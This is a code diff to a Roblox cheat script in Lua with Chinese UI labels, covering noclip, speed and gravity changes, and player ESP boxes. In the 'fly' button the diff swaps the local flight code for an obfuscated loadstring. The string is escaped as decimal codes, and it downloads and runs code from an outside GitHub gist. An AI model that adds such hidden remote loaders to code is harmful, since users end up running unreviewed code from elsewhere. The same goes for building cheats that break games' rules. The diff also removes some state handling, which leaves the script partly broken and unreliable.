@@ -22,9 +22,8 @@ local PlayerValues = {
    WalkSpeed = 16,
    Gravity = 196.2,
    Noclip = false,
-   Flying = false,
-   FlySpeed = 50,
-   ESP = false
+   ESP = false,
+   ESPBoxes = {}
 }
 
 -- ========== 更改器分類 ==========
@@ -122,8 +121,6 @@ ModifierTab:CreateToggle({
    CurrentValue = false,
    Flag = "Noclip",
    Callback = function(Value)
-      PlayerValues.Noclip = Value
-      
       if Value then
          -- 開啟穿牆
          local player = game.Players.LocalPlayer
@@ -168,109 +165,22 @@ ModifierTab:CreateToggle({
 
 -- ========== 常用外掛分類 ==========
 
--- 飛行速度輸入框
-PluginTab:CreateInput({
-   Name = "飛行速度",
-   PlaceholderText = "輸入飛行速度數值",
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-      local flySpeedValue = tonumber(Text)
-      if flySpeedValue then
-         PlayerValues.FlySpeed = flySpeedValue
-         Rayfield:Notify({
-            Title = "飛行速度已更改",
-            Content = "飛行速度已設置為: " .. flySpeedValue,
-            Duration = 2,
-            Image = 4483362458
-         })
-      else
-         Rayfield:Notify({
-            Title = "錯誤",
-            Content = "請輸入有效的數字",
-            Duration = 2,
-            Image = 4483362458
-         })
-      end
-   end
-})
-
--- 飛行開關
-PluginTab:CreateToggle({
+-- 飛行按鈕
+PluginTab:CreateButton({
    Name = "飛行",
-   CurrentValue = false,
-   Flag = "Flying",
-   Callback = function(Value)
-      PlayerValues.Flying = Value
+   Callback = function()
+      loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
       
-      if Value then
-         -- 開啟飛行
-         local player = game.Players.LocalPlayer
-         local character = player.Character
-         local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-         
-         if humanoidRootPart then
-            local bodyVelocity = Instance.new("BodyVelocity")
-            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
-            bodyVelocity.Parent = humanoidRootPart
-            bodyVelocity.Name = "FlyVelocity"
-            
-            local connection
-            connection = game:GetService("RunService").RenderStepped:Connect(function()
-               if not PlayerValues.Flying then
-                  bodyVelocity:Destroy()
-                  connection:Disconnect()
-                  return
-               end
-               
-               local camera = workspace.CurrentCamera
-               local moveDirection = Vector3.new(0, 0, 0)
-               
-               if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
-                  moveDirection = moveDirection + (camera.CFrame.LookVector * PlayerValues.FlySpeed)
-               end
-               if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
-                  moveDirection = moveDirection - (camera.CFrame.LookVector * PlayerValues.FlySpeed)
-               end
-               if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
-                  moveDirection = moveDirection - (camera.CFrame.RightVector * PlayerValues.FlySpeed)
-               end
-               if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
-                  moveDirection = moveDirection + (camera.CFrame.RightVector * PlayerValues.FlySpeed)
-               end
-               
-               bodyVelocity.Velocity = moveDirection
-            end)
-         end
-         
-         Rayfield:Notify({
-            Title = "飛行已開啟",
-            Content = "使用 WASD 控制飛行方向",
-            Duration = 2,
-            Image = 4483362458
-         })
-      else
-         -- 關閉飛行
-         local character = game.Players.LocalPlayer.Character
-         local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-         
-         if humanoidRootPart then
-            local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
-            if flyVelocity then
-               flyVelocity:Destroy()
-            end
-         end
-         
-         Rayfield:Notify({
-            Title = "飛行已關閉",
-            Content = "飛行已停止",
-            Duration = 2,
-            Image = 4483362458
-         })
-      end
+      Rayfield:Notify({
+         Title = "飛行已啟動",
+         Content = "飛行腳本已執行",
+         Duration = 2,
+         Image = 4483362458
+      })
    end
 })
 
--- 透視玩家開關
+-- 透視玩家開關 (Box ESP)
 PluginTab:CreateToggle({
    Name = "透視玩家",
    CurrentValue = false,
@@ -281,43 +191,79 @@ PluginTab:CreateToggle({
       if Value then
          -- 開啟透視
          local players = game:GetService("Players"):GetPlayers()
+         local camera = workspace.CurrentCamera
          
          for _, player in pairs(players) do
             if player ~= game.Players.LocalPlayer and player.Character then
                local character = player.Character
-               for _, part in pairs(character:GetDescendants()) do
-                  if part:IsA("BasePart") then
-                     part.CanCollide = false
-                     part.Transparency = 0.3
+               local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+               
+               if humanoidRootPart then
+                  -- 創建外框 (Box)
+                  local box = Instance.new("Part")
+                  box.Name = "ESPBox_" .. player.Name
+                  box.Shape = Enum.PartType.Block
+                  box.Material = Enum.Material.Neon
+                  box.Color = Color3.fromRGB(0, 255, 0)
+                  box.CanCollide = false
+                  box.CFrame = humanoidRootPart.CFrame
+                  box.Transparency = 0.7
+                  box.TopSurface = Enum.SurfaceType.Smooth
+                  box.BottomSurface = Enum.SurfaceType.Smooth
+                  box.Parent = workspace
+                  
+                  -- 縮放外框以適應角色大小
+                  box.Size = Vector3.new(3, 5, 3)
+                  
+                  -- 保存外框參考
+                  if not PlayerValues.ESPBoxes[player.Name] then
+                     PlayerValues.ESPBoxes[player.Name] = {}
                   end
+                  PlayerValues.ESPBoxes[player.Name].box = box
+                  
+                  -- 持續更新外框位置
+                  local connection
+                  connection = game:GetService("RunService").RenderStepped:Connect(function()
+                     if not PlayerValues.ESP or not player.Parent or not character.Parent then
+                        if box and box.Parent then
+                           box:Destroy()
+                        end
+                        connection:Disconnect()
+                        PlayerValues.ESPBoxes[player.Name] = nil
+                        return
+                     end
+                     
+                     if humanoidRootPart and box then
+                        box.CFrame = humanoidRootPart.CFrame
+                     end
+                  end)
+                  
+                  PlayerValues.ESPBoxes[player.Name].connection = connection
                end
             end
          end
          
          Rayfield:Notify({
             Title = "透視玩家已開啟",
-            Content = "其他玩家現在是半透明的",
+            Content = "玩家位置外框已顯示",
             Duration = 2,
             Image = 4483362458
          })
       else
          -- 關閉透視
-         local players = game:GetService("Players"):GetPlayers()
-         
-         for _, player in pairs(players) do
-            if player ~= game.Players.LocalPlayer and player.Character then
-               local character = player.Character
-               for _, part in pairs(character:GetDescendants()) do
-                  if part:IsA("BasePart") then
-                     part.Transparency = 0
-                  end
-               end
+         for playerName, data in pairs(PlayerValues.ESPBoxes) do
+            if data.box and data.box.Parent then
+               data.box:Destroy()
+            end
+            if data.connection then
+               data.connection:Disconnect()
             end
          end
+         PlayerValues.ESPBoxes = {}
          
          Rayfield:Notify({
             Title = "透視玩家已關閉",
-            Content = "玩家恢復正常顯示",
+            Content = "玩家外框已移除",
             Duration = 2,
             Image = 4483362458
          })
@@ -332,10 +278,6 @@ ModifierTab:CreateButton({
       PlayerValues.JumpPower = 50
       PlayerValues.WalkSpeed = 16
       PlayerValues.Gravity = 196.2
-      PlayerValues.Noclip = false
-      PlayerValues.Flying = false
-      PlayerValues.FlySpeed = 50
-      PlayerValues.ESP = false
       
       local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
       if humanoid then
@@ -350,7 +292,6 @@ ModifierTab:CreateButton({
          for _, part in pairs(character:GetDescendants()) do
             if part:IsA("BasePart") then
                part.CanCollide = true
-               part.Transparency = 0
             end
          end
       end
